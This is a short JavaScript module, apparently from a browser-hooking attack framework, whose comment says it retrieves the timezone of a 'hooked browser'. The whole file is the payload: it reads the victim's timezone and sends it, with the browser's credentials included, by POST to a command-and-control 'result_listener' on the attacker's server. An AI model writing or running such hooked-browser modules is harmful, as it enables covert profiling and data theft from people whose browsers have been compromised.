/*
Module to retrieve timezone of the hooked browser
*/

(function getTimezone() {
    let formData = new FormData();
    formData.append('result', Intl.DateTimeFormat().resolvedOptions().timeZone);
    formData.append('module_value', 'timezone.js')

    fetch(`${protocol}://${server}/command/result_listener`, {
        method: "POST",
        mode: 'cors',
        credentials: "include",
        body: formData
    })
})()